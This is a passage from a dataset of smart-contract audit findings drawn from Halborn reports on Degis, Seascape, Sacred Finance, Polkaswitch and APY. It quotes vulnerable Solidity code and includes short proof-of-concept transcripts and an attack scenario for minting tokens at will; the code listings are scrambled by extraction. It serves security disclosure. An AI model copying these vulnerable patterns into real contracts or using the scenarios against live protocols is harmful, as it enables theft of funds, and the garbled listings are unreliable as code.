parameters. Code Location: Listing 6: src/reward/WeightedFarmingPool.sol (Line 327) updatePool ( _id ); uint256 _id , address _token , uint256 _amount , address _user 299 function _withdraw ( 300 301 302 303 304 ) internal { 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 ); SCALE - user . rewardDebt ; pool . rewardToken , _user , pending require ( _amount > 0, \" Zero amount \"); require ( _id <= counter , \" Pool not exists \" ); PoolInfo storage pool = pools [ _id ]; UserInfo storage user = users [ _id ][ _user ]; if ( user . share > 0) { uint256 pending = ( user . share * pool . accRewardPerShare ) / uint256 actualReward = _safeRewardTransfer ( emit Harvest ( _id , _user , _user , actualReward ); 30 } IERC20 ( _token ). transfer ( _user , _amount ); 325 326 327 POC: 31 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It should be verified that _getIndex is valid and verify that token is from that pool. Probably add a mapping of token address -> poolID and verify that. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 32 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "UPDATING THE 0 INDEX TOKEN WEIGHT VIA UNREGISTERED TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The updateWeight function is updating the pool weight via the _getIndex index, which as stated before it is incorrectly implemented. This allows the first token weight on the pool to be updated if an unregistered or invalid token is provided as the parameter. Furthermore, the code does not check if the weight is greater than 0. Code Location: Listing 7: src/reward/WeightedFarmingPool.sol (Line 138) 145 function updateWeight ( uint256 _id , 146 address _token , 147 uint256 _newWeight 148 149 ) external { 150 151 152 153 154 155 } updatePool ( _id ); uint256 index = _getIndex ( _id , _token ); pools [ _id ]. weight [ index ] = _newWeight ; Risk Level: Likelihood - 5 Impact - 5 33 Recommendation: It should be verified that _getIndex is correctly implemented and verify that token is from that pool. Probably add a mapping of token address -> poolID and verify that instead of the array in O(1) time. Furthermore, the code should check if the new set weight is greater than 0. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 34 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "PUBLICLY EXPOSED FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "functions the involved Several WeightedFarmingPool contract, which are publicly exposed and without any sort of access control: management being the are in of  addPool: It can add an arbitrary pool into the system.  addToken: It can add any token, even not whitelisted, into any pool.  updateWeight: It does allow updating the weight of any token of any pool.  setWeight: Same as updateWeight but for the entire pool tokens.  updateRewardSpeed: It does allow updating the rewards per second for a pool.  setPolicyCenter: as described on DEPOSITING TO ANY POOL/TOKEN WITH ANY AMOUNT VIA CONTROLLED POLICY CENTER. Code Location: Listing 8: src/reward/WeightedFarmingPool.sol (Line 138) 145 function updateWeight ( uint256 _id , 146 address _token , 147 148 uint256 _newWeight 149 ) external { 150 151 152 153 154 155 } updatePool ( _id ); uint256 index = _getIndex ( _id , _token ); pools [ _id ]. weight [ index ] = _newWeight ; 35 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The described functions should implement control access to prevent mali- cious modifications. Some functions should verify that they are called only though priorityPoolFactory. Remediation Plan: SOLVED: All the stated calls are checking if the sender is a valid- registered pool using IPriorityPoolFactory. The setPolicyCenter function was removed from the WeightedFarmingPool contract. 36 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "DEPOSITING TO SECONDARY TOKENS DOES CAUSE THE CONTRACT TO LOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The code under _deposit is assuming that user.amount will contain an array for all newly added tokens to the pool, which is not the case if the user performs a deposit for the first time on a token whose index is !=0. Code Location: Listing 9: src/reward/WeightedFarmingPool.sol (Lines 283-288) user . amount . push (0) ; pool . amount . push (0) ; 282 // check if current index exists for user 283 if ( user . amount . length < index + 1) { 284 285 } 286 if ( pool . amount . length < index + 1) { 287 288 } 289 290 user . amount [ index ] += _amount ; 291 user . share += _amount * pool . weight [ index ]; 292 293 pool . amount [ index ] += _amount ; 294 pool . shares += _amount * pool . weight [ index ]; 295 296 user . rewardDebt = ( user . share * pool . accRewardPerShare ) / SCALE ; 37 POC: Risk Level: Likelihood - 5 Impact - 5 Recommendation: The code should be using mappings instead of arrays to store the amount information. The key for the mapping should be the actual token address. Remediation Plan: SOLVED: The code is now checking the user.amount length and comparing it against the extracted index. If it is required, empty values will be 38 pushed to satisfy the difference between them. 39 ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Critical"]}, {"title": "POOL INCOMES ON REPORTER REWARD CAN BE ARBITRARILY INCREASED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf", "body": "The function premiumIncome allows increasing arbitrarily the array of pool incomes used to calculate the final reward for a correct reporter. Using this function to increase the value of a selected pool income before executing an incident report made from a malicious account could lead to an attacker draining the entire SHD token balance from Treasury smart contract. Code Location: Listing 10: src/pools/Treasury.sol (Line 52) 52 function premiumIncome ( uint256 _poolId , uint256 _amount ) external  { 53 54 } poolIncome [ _poolId ] += _amount ; POC: 40 Risk Level: Likelihood - 5 Impact - 5 Recommendation: This function should implement control access to prevent malicious mod- ifications on poolIncome array. Remediation Plan: SOLVED: The code is now checking that the caller is only the policyCenter. 41 3.10 (HAL-10) INVALID VARIABLE VISIBILITY DOES CAUSE CONTRACT DEADLOCK - CRITICAL ", "labels": ["Halborn", "Degis_SCProtection", "Severity: Informational"]}, {"title": "UNUSABLE CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ImportExportElasticNft.sol smart contract constructor initializes the nft variable to the same value. This cause nft value to be equal to Once deployed, this means 0x0000000000000000000000000000000000000000. that the contract cannot be used since there is no way to modify this variable. Code Location: Listing 1: ImportExportElasticNft.sol (Line 19) 18 19 20 21 22 constructor ( address nft ) SecureContract ( true , true ) { nft = _nft ; owner = msg . sender ; verifier = msg . sender ; } Proof of Concept: To replicate this issue: - Deploy the smart contract with any address as NFT. - check the NFT address of the contract. Listing 2: pentest.js elastic = await ( await ( await hre . ethers . getContractFactory (\" 1  ImportExportElasticNft \" )) 2 3 4 . deploy ( block . address )) . deployed () ; console . log ( ' [+] nft addr : ' + await elastic . nft () ); 13 Listing 3: Output Elastic Testing 1 2 [+] nft add : 0 x0000000000000000000000000000000000000000 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to use the parameters of the constructor correctly to set the correct addresses when deploying the smart contract and avoid mentioned scenarios. Remediation Plan: SOLVED: The SeaScape team now assigns correctly the _nft parameter to the nft state variable. 14 ", "labels": ["Halborn", "Seascape_Block_Lords_Import_Export", "Severity: Medium"]}, {"title": "UNDEFINED VARIABLES ARE USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ImportExportElasticNft.sol smart contract uses undefined variables, resulting in contracts which do not compile. Code Location:  nftExportNonce (ImportExportElasticNft.sol#59,65) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to declare all used variables. Remediation Plan: SOLVED: The SeaScape team has implemented and declared the mapping nftExportNonce. 15 ", "labels": ["Halborn", "Seascape_Block_Lords_Import_Export", "Severity: Low"]}, {"title": "UNDEFINED IMPORTS ARE USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ImportExportElasticNft.sol smart contract uses undefined castings referring to other contracts. The name of these contracts is not correct. Code Location:  Blocklords (ImportExportElasticNft.sol#46,47,67) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to define all castings correctly to other contracts. Remediation Plan: SOLVED: The SeaScape team has renamed the Blocklord contract to BlockLords to correct this import. 16 ", "labels": ["Halborn", "Seascape_Block_Lords_Import_Export", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been detected that some functions, such as exportNft(), and exportToken() of the smart contracts, are missing address validation. Every input address should be checked not to be zero, especially the ones that could lead to rendering the contract unusable, lock tokens, etc. This is considered a best practice. Code Location: Listing 4: ImportExportManager.sol (Lines 108,133) 108 function exportNft ( address nft , uint nftId , uint8 _v , bytes32  _r , bytes32 _s ) external { 109 110 111 112 require ( supportedNfts [ nft ], \" unsupported token \"); // / Validation of quality // / message is generated as owner + amount + last time  stamp + quality 113 114 115 bytes memory _prefix = \" \\ x19Ethereum Signed Message :\\ n32 \" ; bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( msg . sender , nft , address ( this ) ,  block . chainid , nftId , nftExportNonce [ msg . sender ]) ); 116 bytes32 _message = keccak256 ( abi . encodePacked ( _prefix ,  _messageNoPrefix )); 117 118 119 120 121 122 123 124 125 126 address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" verification failed \" ); nftExportNonce [ msg . sender ]++; address accountHodler = accountHodlerOf ( msg . sender ); if ( address ( accountHodler ). codehash == 0) { require ( deploy ( accountHodler , msg . sender ) , \" Failed to  deploy the contract \" ); 127 AccountHodler ( accountHodler ). initialize ( owner ); 17 128 129 130  nftId ); } AccountHodler ( accountHodler ). exportNft ( nft , msg . sender , 131 132 133 } function exportToken ( address token , uint amount , uint fee ,  uint8 _v , bytes32 _r , bytes32 _s ) external { 134 135 136 137 require ( supportedTokens [ token ], \" unsupported token \" ); // / Validation of quality // / message is generated as owner + amount + last time  stamp + quality 138 139 140 bytes memory _prefix = \" \\ x19Ethereum Signed Message :\\ n32 \" ; bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( msg . sender , token , address ( this  ) , block . chainid , amount , fee , tokenExportNonce [ msg . sender ]) ); bytes32 _message = keccak256 ( abi . encodePacked ( _prefix , 141  _messageNoPrefix )); 142 143 144 145 146 147 148 149 150 151 address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" verification failed \" ); tokenExportNonce [ msg . sender ]++; address accountHodler = accountHodlerOf ( msg . sender ); if ( address ( accountHodler ). codehash == 0) { require ( deploy ( accountHodler , msg . sender ) , \" Failed to  deploy the contract \" ); 152 153 154 155 AccountHodler ( accountHodler ). initialize ( owner ); } AccountHodler ( accountHodler ). exportToken ( token , msg . sender ,  feeReceiver , amount , fee ); 156 } Risk Level: Likelihood - 2 Impact - 2 18 Recommendation: It is recommended to validate that each address inputs in the exportNft(), exportToken(), supportNft(), supportToken() and similar functions from the smart contracts are non-zero. Remediation Plan: SOLVED: The SeaScape team now validates the inputs where an address is used to verify they are non-zero before performing any functionality. 19 ", "labels": ["Halborn", "Seascape_Block_Lords_Import_Export", "Severity: Low"]}, {"title": "PUBLICLY AVAILABLE FUNCTION COULD REDUCE THE AMOUNT OF INTERESTS EARNED ON AAVE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "The collectAaveInterests function in the ETHSacred contract was publicly This function allows calculating the amount of interest accessible. earned on Aave WETH deposits up to the current block, and automatically withdrawing that portion of WETH, exchanging it them with AWETH (Aave interest bearing WETH). While the amount withdrawn would be sent to the AaveInterestProxy contract, and thus stored securely, this would reduce the amount of compound interest earned on the deposit. Code Location: The following function code was available in the ETHSacred contract (Lines #93-101): Listing 1 if ( interests > 0 && aaveInterestsProxy != address (0) ) { uint256 interests = AToken ( wETHToken ). balanceOf ( address ( this )) address lendingPool = AddressesProvider ( 1 function collectAaveInterests () public payable { 2  - collateralAmount ; 3 4  lendingPoolAddressProvider ). getPool () ; 5  aToken approval failed \" ); 6  aaveInterestsProxy ); 7 8 9 } totalAaveInterests += interests ; } require ( AToken ( wETHToken ). approve ( wETHGateway , interests ) , \" WETHGateway ( wETHGateway ). withdrawETH ( lendingPool , interests , 15 Recommendation: Halborn recommends that this logic be reviewed, and the function is not made accessible by everyone. While the amount of additional interest that could have been earned from compounding might be small, attackers could still launch a griefing attack against Sacred Finance users due to the extremely cheap transaction fees on Polygon. In addition, this function was only called within this contract, so it could be done internally or privately. Finally, it is recommended to review if this function should also be called on the deposit operations, or only to withdrawals, to further maximize the time spent on Aave WETH pools. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by setting the visibility of the collectAaveInterests function to private. 16 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Medium"]}, {"title": "INITIALIZATION CAN BE FRONTRUN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "It was identified that all the contracts that make use of an initialization function could be frontrun by an attacker during the deployment phase, who could then set critical parameters such as user roles. While Sacred Finance could re-deploy the contracts, it would incur financial costs. This was also evident from the deployment scripts which did not perform any checks whether the correct parameters were updated in the contracts by making use of an initialization function. Furthermore, if Sacred Finance deploys their contracts and does not identify that they have already been initialized, users could start using a system that was compromised from the start. Code Location: This applies to all contracts using an initializer function. Here is an example: Listing 2 if (! initialized ) { miner = _miner ; initialized = true ; 1 function initialize ( address _miner ) external { 2 3 4 5 6 } } The full list is provided below:  AaveInterestsProxy.sol  RewardSwap.sol  SacredProxy.sol  SacredTrees.sol 17 Risk Level: Likelihood - 4 Impact - 2 Recommendation: Halborn recommends that the initialization logic be checked to ensure that it cannot be frontrun. At a minimum, the initialize function must be reverted when called after initialization, and the logic must be included in the Constructor or a proxy pattern with deployment and initialization in the same function must be implemented instead. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by adding the onlyOwner modifier to the initialize functions. 18 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Medium"]}, {"title": "LACK OF TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "Smart contracts did not implement a two-step transfer of ownership pat- tern. This pattern prevents transferring ownership of a smart contract to a wrong address, and never being able to retrieve control of it. While Sacred Finance might want to renounce ownership of the contracts, this should be done via the renounceOwnership function. On the other hand, the two-step ownership transfer pattern would allow to first propose a new owner, and only effectively transfer ownership when the new owner accepts it. If the original owner identifies an error in the proposal, they can cancel it at any time before the new owner accepts it. Risk Level: Likelihood - 2 Impact - 2 Recommendation: Halborn recommends that the pattern be implemented where it is deemed necessary so that roles can be safely transferred between accounts. Furthermore, when not governed by a governance, all privileged accounts must use a multi-signature account. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by implementing the transfer-ownership pattern for the Sacred contract. 19 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Low"]}, {"title": "MISSING ZERO VALUE CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "Halborn identified that, within the code, the setter functions lacked input validation. While these functions can only be called by an ad- ministrative role, if they make a mistake an update error and set an invalid value, this could lead to calculation errors and potentially other functions reverting due to division by zero. Code Location: Listing 3 Nonce : 63 Gas used : 14178 Gas limit : 30000000 Block : 32477231 Gas price : 0.0 gwei Transaction confirmed 1 swap . poolWeight () 2 100000000000 3 >>> swap . setPoolWeight (0 , { ' from ': miner }) 4 Transaction sent : 0  x655ca2224e0cf75fc00b6a8589e0d27ca78da9fec7fdfcee71f4adc967e129e0 5 6  (0.05%) 7 8 < Transaction '0  x655ca2224e0cf75fc00b6a8589e0d27ca78da9fec7fdfcee71f4adc967e129e0 '  > 9 >>> swap . swap ( owner , 99999999999999999999999999999 , { ' from ': miner  }) 10 Transaction sent : 0  x9be32c81470c90602ada963b6864316ac3ac382f189549fb66fb8dc11cac7f41 11 12  25048 (0.08%) 13 14 swap . setPoolWeight (100000000000 , { ' from ': miner }) 15 Transaction sent : 0  xbbb7f9d4a6f1cb15e6501445e1472e20a7489d44c0db4270ab797b1c4c84126c 16 Gas price : 0.0 gwei Transaction confirmed ( reverted ) Gas price : 0.0 gwei Gas limit : 30000000 Gas limit : 30000000 Block : 32477232 Gas used : Nonce : 64 Nonce : 65 20 Block : 32477233 Gas used : 43403 Transaction confirmed 17  (0.14%) 18 19 < Transaction '0  xbbb7f9d4a6f1cb15e6501445e1472e20a7489d44c0db4270ab797b1c4c84126c '  > 20 >>> swap . swap ( owner , 99999999999999999999999999999 , { ' from ': miner  }) 21 Transaction sent : 0  xcd797da059f57eabc966385199e1b39647551303ca865e06e2995ab4b5652805 22 23  (0.17%) 24 25 < Transaction '0  xcd797da059f57eabc966385199e1b39647551303ca865e06e2995ab4b5652805 '  > Gas price : 0.0 gwei Transaction confirmed Gas limit : 30000000 Block : 32477234 Gas used : 49852 Nonce : 66 21 The full list can be found below:  ETHSacred - setAaveInterestsProxy  Sacred.sol - changeOperator, setFee  Miner.sol setMinimumInterests, - setVerifiers, setRates setPoolWeight, , setAaveInterestProxyContract is here (The reduced due to the functions only be callable by the governance role) setSacredTreesContract, setAaveInterestFee, mistake risk of  RewardSwap.sol - setPoolWeight  SacredProxy.sol - setSacredTreesContract, updateInstance (only callable by the governance role)  SacredTrees.sol - setSacredProxyContract, setVerifierContract (only callable by governance) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Halborn recommends that checks be implemented to ensure that the different smart contract functions only accept the expected values. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by adding additional null value checks where deemed necessary. 22 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Low"]}, {"title": "GAS OPTIMIZATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "Within the for loops in the contract code, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This does not only apply to the iterator variable. It also applies to variables declared within the loop code block. Code Location:  Miner.sol Lines 172; 192; 406; 424  SacredProxy.sol Lines 56; 114  SacredProxyLight.sol Lines 32  MerkleTreeWithHistory.sol Lines 33; 59  Sacred.sol Lines 108  SacredTrees.sol Lines 112; 160 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This applies to the iterator variable and to variables declared within the loop code block. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by using ++i instead of i++. 23 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Informational"]}, {"title": "MISSING REENTRANCY PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "It was identified that one function within the Miner contract that made external calls to other contracts, which would then make use of a low- level call function to transfer funds, did not implement a reentrancy guard. While this function does not look exploitable due to additional validation, it is still recommended to implement the reentrancy guard to protect against extreme cases. Code Location: Miner.sol - Function withdraw Line #260 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the aforementioned function implement the nonReentrant modifier from OpenZeppelins contracts. Remediation Plan: SOLVED: the Sacred Finance team nonReentrant modifier to the withdraw function. solved The issue by adding the 24 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Informational"]}, {"title": "OUTDATED SOLIDITY VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "While reviewing the contracts, it was identified that the pragma version in use was outdated. While this might not pose any direct security risks, the versions in use lack certain security features and optimizations which could greatly benefit the protocol. Some benefits are described below:  Safemath by default since 0.8.0 (can be more gas efficient than the SafeMath library)  Low level inline: as of 0.8.2, leads to cheaper gas runtime. This is especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions, and if they are not built in, they cost an additional 20 to 40 gas due to the 2 extra jump instructions and additional stack operations needed for function calls.  Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases, used an additional storage read operation. After EIP-2929, if the slot was already cold, this means an unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.  Custom errors from 0.8.4, leads to cheaper deploy time cost and run-time cost. Note: the run-time cost is only relevant when the revert condition is met. In short, replace revert strings with custom errors. Furthermore, having built-in overflow/underflow checks could benefit the contract code to assure that calculations that use unsafe calculations (using +, -, /, *) will not be vulnerable under extreme test cases. 25 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the contracts are upgraded to a newer version of Solidity. The recommended version is >= 0.8.10 as these versions include several improvements and enhanced security features such as built-in overflow/underflow protection. It should be noted that this does not cover the casting of variable types. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by using the 0.8.9 pragma version. 26 ", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Informational"]}, {"title": "REDUNDANT CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf", "body": "While reviewing the code, it was identified that while a function to calculate the Aave reward amount was included in the Miner contract code, this was not used within the reward function, and instead, the same calculations were replicated. While not posing a security risk, this increases the complexity of the contracts, as well as the gas cost for deployment. Code Location: Miner.sol Lines #211-214 Listing 4 1 uint256 interestAmount ; 2 if ( totalShareSnapshots [ _args . rewardNullifier ][0] > 0) { interestAmount = totalShareSnapshots [ _args . rewardNullifier ][1]. 3  mul ( _args . apAmount ). div ( totalShareSnapshots [ _args . rewardNullifier  ][0]) ; 4 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the getAaveInterestAmount function is used instead of re-writing the code into the reward function. This could be rewritten as: 27 Listing 5 1 uint256 interestAmount = getAaveInterestAmount ( args .  rewardNullifier , args . apAmount ); Remediation Plan: SOLVED: getAaveInterestAmount function. Sacred Finance team The solved the issue by using the 28 3.9 Circuit Review Halborn reviewed the Circom circuits that Sacred Finance implemented in their code. The Circuits were reviewed for common ZK Snark circuits issues such as the following:  Integer overflow/underflow  Non-binding constrains  Double spending  Optimizations  Logic errors While most of the code was forked from Tornado Cash, there were specific differences which are described below. Sacred-Anonymity-Mining Within the Reward.circom circuits, an additional field was added, which represents the noteNullifierHash hash. This is later used to invalidate spent notes, and only the hashed value is used. This can be observed within the circuit code when computing the reward nullifier, which is the Poseidon hash of the noteNullifierHash instead of the noteNullifier as in Tornado Cash. Furthermore, to incorporate Aave lending interests, the following two signals were added: Listing 6 1 signal private input inputAaveInterestAmount 2 signal private input outputAaveInterestAmount This resulted in extra parameters used in the Poseidon hash function. Furthermore, the following was added: 29 Listing 7 1 apAmount === rate * ( withdrawalBlock - depositBlock ) 2 aaveInterestAmount === ( outputAaveInterestAmount -  inputAaveInterestAmount ); This ensures that the ap amount is constrained to the rate multiplied by the difference between the withdrawal and deposit block (thus the length of a deposit). Finally, the second line verifies the aaveInterestAmount input, asserting that the inputs to the circuit respect this equality. Within Withdraw.circom, Sacred Finance includes the AaveInterestAmount as shown below: Listing 8 1 inputAaveInterestAmount === outputAaveInterestAmount +  aaveInterestAmount ; This allows to ensure that the correct reward amount is validated via the ZK proof, upon withdrawal; In more detail, the input to the circuit needs to be equal to the Aave interest left in the contract after withdrawal plus the actual Aave interest amount rewarded to users. Sacred-Contracts-Eth The circuits within this repository include a template for MerkleTree computation, as well as a utility to compute the Pedersen hash of the commitment and the nullified for each proof. These circuits are the same as Tornado Cash. These utilities are used within the withdraw circuit. No security risks were identified within these circuits. SACRED TREES Within the BatchTreeUpdate.circom circuits, the only difference with Tornado cash is the CHUNK_TREE_HEIGHT being set to 1. This is correctly 30 replicated in the sacredTrees.sol smart contract. 31 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Sacred_Finance_Circom_Circuit", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "All Smart Contracts use the floating pragma ^0.6.12. Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Reference: ConsenSys Diligence - Lock pragmas Code Location: Greeter.sol: [Line #2] SwitchToken.sol: [Line #23] staking/Farming.sol: [Line #1] 12 vesting/PrivateVesting.sol: [Line #1] vesting/Vesting.sol: [Line #1] Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is not recommended to use a Consider locking the pragma version. floating pragma in production. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat-config.js for HardHat framework. 13 Remediation Plan: SOLVED: Polkaswitch team locked the pragma version to 0.6.12 in all contracts. ", "labels": ["Halborn", "Polkaswitch", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Vesting.sol Lines #134-142 PrivateVesting.sol Lines #102-110 14 Risk Level: Likelihood - 1 Impact - 4 Recommendation: The Vesting.sol and PrivateVesting.sol smart contracts are missing a nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: SOLVED: nonReentrant modifier was added to all the above reported methods. ", "labels": ["Halborn", "Polkaswitch", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. 15 Code Location: SwitchToken.sol: [Line #251] staking/Farming.sol: [Line #126] [Line #192], [Line #196], [Line #205], [Line #206] vesting/PrivateVesting.sol: [Line #75] [Line #158], [Line #160], [Line #162], [Line #164] 16 vesting/Vesting.sol: [Line #105] [Line #190], [Line #192], [Line #197] Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: Development team confirmed that their timescale is larger than 900 seconds when using block.timestamp. So this issue will not affect in this case. 17 ", "labels": ["Halborn", "Polkaswitch", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkaswitch_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: SwitchToken.sol: [Line #86], [Line #93] [Line #136] vesting/PrivateVesting.sol: [Line #48], [Line #55], [Line #62], [Line #69] 18 [Line #73], [Line #86], [Line #102] [Line #116], [Line #139] 19 vesting/Vesting.sol: [Line #99], [Line #118], [Line #134] [Line #148], [Line #171] 20 Risk Level: Likelihood - 1 Impact - 1 Recommendations: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Modifiers has been changed to external for all the methods above reported 21 3.5 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "Polkaswitch", "Severity: Informational"]}, {"title": "POSSIBILITY OF MANUAL MINTING / BURNING OF MAPT TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/APY_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Due to the fact mint function from MetaPoolToken smart contract is public and restricted just by onlyManager modifier, a malicious owner can change temporarily PoolManager address and manually mint / burn mAPT tokens at will. This situation would allow malicious owner (or users as well) to deposit or withdraw more or less than their fair share. Code Location: Attack scenario: As a matter of example, a step-by-step attack scenario to mint mAPT tokens manually will be described. Step 1: Malicious owner (or even an external attacker) calls registerAddress function with the following parameters:  id: \"poolManager\"  _address: 0xABC...DEF (controlled by malicious owner) Listing 1: AddressRegistryV2.sol (Lines 114) 108 function 